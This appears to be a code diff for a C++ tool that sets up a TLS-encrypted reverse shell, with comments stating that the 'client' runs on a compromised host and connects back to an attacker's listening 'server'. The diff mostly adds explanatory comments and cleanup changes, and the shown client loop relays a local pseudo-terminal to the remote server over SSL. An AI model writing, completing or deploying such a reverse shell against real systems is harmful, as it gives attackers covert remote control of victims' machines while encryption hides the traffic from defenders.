@@ -1,7 +1,5 @@
 #include "utils.h"
 #include "args_parser.h"
-#include <openssl/ssl.h>
-#include <openssl/err.h>
 
 // error msgs
 std::string pipeFailed = "[!] Pipe creation failed!";
@@ -44,7 +42,6 @@ void configureServerCtx(SSL_CTX* ctx) {
     }
 }
 
-// placeholder for now
 void server(const std::string &serverIpAddr, unsigned int portNum) {
     int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -153,10 +150,8 @@ void server(const std::string &serverIpAddr, unsigned int portNum) {
         }
     }
 
-
     SSL_free(ssl);
     SSL_CTX_free(ctx);
-    EVP_cleanup();
 
     close(clientSocket);
     close(serverSocket);
@@ -185,10 +180,13 @@ void client(const std::string &ipAddr, unsigned int portNum) {
         exit(-1);
     }
 
+    // as of openssl 1.1.0, openssl can allocate all resources required (error strings, etc)
     OPENSSL_init_ssl(0, NULL);
 
     SSL_CTX* ctx = createClientContext();
     SSL* ssl = SSL_new(ctx);
+    //https://docs.openssl.org/master/man3/SSL_set_fd/
+    // "bind" to socket, or set ssl fd to socket input/output
     SSL_set_fd(ssl, clientSocket);
 
     if (SSL_connect(ssl) <= 0) {
@@ -211,7 +209,6 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 
     fd_set fds;
     char ttyBuffer[4096];
-
     while (true) {
         FD_ZERO(&fds);
         FD_SET(clientSocket, &fds);
@@ -230,13 +227,16 @@ void client(const std::string &ipAddr, unsigned int portNum) {
                 std::cout << serverDisconnected << std::endl;
                 break;
             }
+            // ssl not required here as were just writing to local shell
             write(masterFd, ttyBuffer, bytesReceived);
         }
 
         if (FD_ISSET(masterFd, &fds)) {
+            // read input from local chell
             ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
+            // check we actually have some data
             if (n > 0) {
-
+                // use ssl to send it to the server
                 SSL_write(ssl, ttyBuffer, n);
             }
         }
@@ -244,11 +244,8 @@ void client(const std::string &ipAddr, unsigned int portNum) {
 
     SSL_free(ssl);
     SSL_CTX_free(ctx);
-    EVP_cleanup();
     close(clientSocket);
     close(masterFd);
-
-
     wait(nullptr);
 }
 
@@ -261,11 +258,11 @@ int main(int argc, char *argv[]) {
      *  'client' would be a compromised host attempting to connect back to attacker
      *  'server' would be an attacker waiting for a connection
      *
-     *  if 'server' arg passed, we just need one parameter and that's a port number to listen on (default 443)
+     *  if 'server' arg passed, we pass the IP address and port to listen on
      *
-     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the 'server'
+     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the listening 'server'
      *
-     *  then connect and set up an encrypted rev shell (method undecided)
+     *  then connect and set up an encrypted rev shell (using OpenSSL TLS, Typically 1.2)
      */
     struct config cfg = parse_args(argc, argv);
 
